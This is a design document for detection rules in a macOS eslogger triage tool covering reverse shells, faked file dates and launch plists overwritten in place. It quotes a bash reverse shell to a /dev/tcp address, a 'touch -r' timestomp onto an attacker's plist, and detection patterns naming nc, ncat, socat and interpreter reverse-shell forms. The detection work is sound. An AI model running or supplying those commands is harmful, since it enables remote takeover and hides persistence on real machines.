# Reverse shells, timestamp faking and launch plists overwritten in place

Three gaps that turned up when the Objective by the Sea "Mitten Mac" lab captures were run through Ficus with a throwaway converter (2026-11-17). Ficus queued most of the labs' answers, but missed these:

1. **Reverse shell.** `sh -c "/bin/bash -i >& /dev/tcp/192.168.4.225/1337 0>&1"`, run by a dropped `netcomsd` binary, was not queued. The one under Excel in another lab was caught only because `risky-parent-spawn` dislikes Office parents. No rule looks at what a reverse shell is.
2. **Timestamp faking.** `touch -r /Library/LaunchDaemons/com.microsoft.OneDriveUpdaterDaemon.plist /Library/LaunchDaemons/com.google.chromeplugin.plist` (give the attacker's daemon plist the dates of a real one) matched nothing.
3. **A launch plist written without a create event.** `cat > /Library/LaunchDaemons/com.google.chromeplugin.plist` was not flagged by `persistence-plist`.

## Intent

These rules are for an investigator triaging a **real eslogger capture** from a Mac, not for the lab files. Supporting the lab format (an adapter) is a separate piece of work, deferred. So the rules may lean on signals only eslogger has: the file descriptors of an exec, and the `write` and `close` events.

What gap 3 really is on a real capture: the lab deliberately recorded no `create` events. With the README's capture command, `cat > new.plist` produces a `create` event and is already flagged. What stays invisible is a plist that already existed and was **overwritten in place**: that shows only as a `write` event, or a `close` event marked modified. Ficus already parses `write`, but `persistence-plist` ignores it.

## Goals

- A new rule, `reverse-shell`, that flags a shell or interpreter reading its commands from a socket, and the command lines that set up a reverse shell.
- A new rule, `timestomp`, that flags setting a file's dates with `touch` or `SetFile` when the file is one that matters (a launch plist, a program that ran, a file in a temporary or hidden place).
- `persistence-plist` flags a launch plist modified in place, seen through `write` or a modified `close`.

## Non-goals

- The OBTS lab format adapter. The labs' command lines can serve as models for test cases, written as our own strings.
- A rule for a binary copied into a PATH folder (`cp /tmp/plugind /usr/local/bin/chrome_plugin`). It needs its own tuning, and is a separate piece of work.
- Extending other plist rules (`apple-masquerade`'s plist form, `known-indicator`'s plist paths) to in-place overwrites.
- **Any change to the README's capture command.** `close` and `write` stay optional: used when present, never asked for. `close` is very noisy (about 42,000 events in a few minutes in one lab capture).
- **Timestamp faking seen through events.** `touch` calls `utimensat`, which macOS turns into `setattrlist`, not `utimes`. The `setattrlist` event says which attributes changed, not the new dates. So no event can say a file was backdated, and recording `setattrlist` has an unmeasured cost. Date changes made by a program through the API, not by `touch` or `SetFile`, go unseen. Revisit only if a real case needs it, after measuring how noisy `setattrlist` is.

## Anti-goals

These would make the work a failure even if it technically worked:

- **New noise in the queue.** On the live lab capture (`scratch/ficus-lab-live.jsonl`), `git`, `docker-tools` and `ps` start with a socket as stdin under Codex and VS Code helpers: libuv (which Node and Electron use to start child processes) gives children socket pairs. A rule that fires on "stdin is a socket" alone would flood the queue on any developer's Mac.
- **`timestomp` firing on builds.** Reproducible builds set dates on the files they just produced (`touch -t`, `touch -d`). These must stay out of the queue.
- **A reverse shell that the cleaner hides.** `ficus-clean.sh` replaces private IPs with `host1.internal.invalid`, so a rule keyed to the address shape would fire before cleaning and not after it.

## Constraints

- Rules live in `src/rules/rules.ts`, in the existing `Rule` shape. Every new rule needs:
  - a README rules-table row (a test keeps the levels in step);
  - a place in a Guide stage (`STAGES` in `src/ui/GuideScreen.tsx`);
  - MITRE names in `src/rules/mitre.ts`;
  - a scene in the synthetic learning lab, with answer-key rows. `test/lab-script.test.ts` requires every rule to fire there.
- The cleaner (`scripts/ficus-clean.jq`) cleans every string of any event type, so `close` events need no special handling. Its findings-equality test (raw against cleaned) has to keep passing with the new scenes.
- eslogger exec `fds` carry `fdtype`: 1 is a vnode, 2 a socket, 6 a pipe (`PROX_FDTYPE_*` in `sys/proc_info.h`). A socket's family (unix or internet) is not recorded.
- `es_event_close_t` has `modified`: true when a filesystem call changed the file. A change made only through a writable memory mapping sets `was_mapped_writable` instead, and is not counted here.
- Like `shell-from-pipe`, the fd checks need eslogger schema 11. Older captures load, and the header says which checks may not apply.

## Approaches considered

- **A. Command-line rules only.** Patterns like `/dev/tcp`, `nc -e`, `touch -r`, plus counting `write` events in `persistence-plist`. Cheap, and it would also work on the OBTS lab files. But a reverse shell set up by a script file or a compiled binary gets past it.
- **B. eslogger signals plus command-line rules (chosen).** The reverse shell's strong signal is the socket on a command-reading shell's stdin. The plist overwrite's is a `write` event or a modified `close`. The command-line patterns stay as a second trigger for the reverse shell, and are the only trigger for timestamp faking (see Non-goals for why).
- **C. B plus a "binary copied into a PATH folder" rule.** Left out: a fourth rule with its own false-positive work, better done on its own.

The investigator picked B, because the target is real captures. After a reviewer found that `touch -r` produces `setattrlist`, not `utimes`, the investigator chose to drop the event half of timestamp faking rather than record `setattrlist`.

## Design

### Parsing (`src/model/parse.ts`, `types.ts`, `builder.ts`)

- **Exec:** next to `stdinIsPipe`, record `stdinIsSocket` (fd 0 has `fdtype` 2). Carry it onto the `Image`, as `stdinIsPipe` is: `null` when the exec had no `fds` array.
- **`close`:** only a close with `modified: true` is kept, as a `FileOp` of kind `'write'` marked as coming from a close, so evidence can say so. An unmodified close is counted in `otherEvents` like any unmodelled event and is not kept, so a capture full of closes does not grow memory.
- **`write`:** already a `FileOp`. Nothing changes here.

### `reverse-shell` (scope `image`, levels high and med)

Title "Reverse shell". MITRE T1059.004 (T1059.006 when Python is the interpreter, T1059 for Perl and Ruby), and T1095 (Non-Application Layer Protocol). Two triggers; a finding says which one applied, or both.

1. **Socket on stdin.** A shell (`SHELLS`) or interpreter (python, perl, ruby) that reads its commands from stdin, by the same test `shell-from-pipe` uses (no `-c`, no inline code, no script file, `-i` allowed), whose stdin is a socket. Once per process, as in `shell-from-pipe` (`sh` re-execs `bash` with the same arguments).
   - **High**, whatever started it. The investigator chose this: a Node or Electron parent is not excused, since a socket handed to `/bin/sh` is exactly how the classic Node reverse shell (for example in a malicious npm install script) looks. No dev tool in the live capture fed a shell over a socket. Revisit if a real capture shows one.
   - **Med** when `sshd` or `sshd-session` is among the process's ancestors (my call: any ancestor, not only the parent). A session started with `ssh -T` hands its shell a socket, and the shells under it inherit that socket.
2. **Command line** (high). Any image whose arguments set up a reverse shell:
   - a `/dev/tcp/` or `/dev/udp/` path in a shell `-c` script that ties the shell's own input or output to it. That means a redirection of stdin, stdout or both (`>&`, `&>`, `0>&1`, `<&`, `0<`), or `exec N<>` (my call). A bare port check (`</dev/tcp/localhost/5432`, `echo > /dev/tcp/host/port` in a wait-for-database loop) is not a reverse shell and is not flagged.
   - `ncat` or `netcat` with `-e`, `-c`, `--exec` or `--sh-exec`, and `nc` with `-e` only. On Apple's `/usr/bin/nc`, `-c` means send CRLF, not run a command.
   - `socat` with an `exec:` or `system:` address.
   - a `-c` script that makes a fifo (`mkfifo`, or `mknod … p`) and runs `nc`, `ncat` or `netcat`.
   - python, perl, ruby or php inline code (`-c`, `-e`, `-r`) that opens a socket and also duplicates descriptors or spawns a shell (`dup2`, `pty.spawn`, `subprocess`, `exec`, `system`, `IO.popen`).
   - zsh's `zmodload zsh/net/tcp` together with `ztcp`.

   Matching is on these words, never on the host or port, so it survives the cleaner.

The `sh -c` that carries the command line and the `bash -i` it starts are two processes, both flagged. They form one chain in the queue, as other parent-and-child findings do.

### `timestomp` (scope `image`, levels high and low; low is context only)

Title "File dates faked". MITRE T1070.006 (Timestomp). It is triggered only by the command line:
- `touch` with `-r`, `-t`, `-d` or `-A`;
- `SetFile` with `-d` or `-m`.

The targets are the non-option arguments; for `touch -r`, the argument after `-r` is the reference file, not a target. Relative targets are resolved against the exec's `cwd` when it has one, as other rules do.

**Severity.**
- **High** when a target is a launch plist (`LAUNCH_DIR`), a program the capture saw run, or a file in a strong odd place (`oddLocation` with strength `strong`: temporary folders, `/Users/Shared`, Downloads, hidden folders).
- **Low**, context only (`gated: 'when-low'`), otherwise. Build scripts set dates for reproducible output, so date-setting alone is not worth a queue row.
- My call: "a file another process dropped earlier" is not a reason for high. A build's `touch -t` targets files the compiler just wrote.

The evidence names the target, and the reference file or the date given. Both are often the most useful part of the finding: the reference file says which legitimate item the attacker hid behind.

### `persistence-plist` (unchanged severity)

It also counts a `write` FileOp (from a `write` event or a modified `close`) whose path is a launch plist. The evidence says "modified in place" for those, and "wrote" for create and rename as now. A `write` on a plist the same process created earlier is the same act and stays one entry: the existing per-path `seen` set covers this.

A system process rewriting its own plist would be noise. My call: none were seen in the capture data I have, so no allowlist up front. If testing on a real capture with `write` turns one up, exclude it by signing ID, not by path.

### README and header

- The README's list of events says that `write` and `close` are optional and noisy, and that a launch plist overwritten in place is only seen when one of them is recorded. The capture command itself does not change.
- When a capture has neither `write` nor `close`, the header's note on missing event types says a plist overwritten in place cannot be seen. Follow the existing mechanism for missing kinds (`CaptureStats.kinds`, and the coverage notes in `src/ui/triage-model.ts`).

### Learning lab

- **Synthetic** (`scripts/ficus-lab.sh synthetic`): add scenes that fire each new trigger, plus the answer-key rows:
  - a dropped program whose `sh -c` uses `bash -i >& /dev/tcp/…`, and the `bash -i` it starts, with a socket stdin;
  - `touch -r` from a real-looking plist onto the lab's stealer launch plist;
  - an existing launch plist modified in place, through a `write` event and a modified `close`.

  Add benign scenes that must stay out of the queue: a wait-for-database `/dev/tcp` port check, a build's `touch -t` on files it just wrote, and `git` started with a socket stdin.
- **Live** (`ficus-lab.sh live`): add `touch -r` onto the lab's own launch agent before it is removed. My call: **no live reverse-shell step**, even to loopback. On a work Mac with endpoint protection, a real `bash -i >& /dev/tcp/127.0.0.1/…` may raise an alert. The answer key lists it among the rules the live mode cannot set off. The live recorder's event list does not change.

### Guide and MITRE

- `reverse-shell` joins the Execution stage. `timestomp` joins "Getting past the defences". `persistence-plist` stays where it is.
- `MITRE_NAMES` gets T1095 (Non-Application Layer Protocol) and T1070.006 (Timestomp).

## Left to the builder

- **Pattern edge cases:** the exact regexes for the command-line triggers, as long as they key on the words listed above and not on hosts.
- **Text and wording:** titles, explanations and evidence, in the style of the existing rules.
- **Test layout:** follow the existing per-rule test files (`test/rule-*.test.ts`).
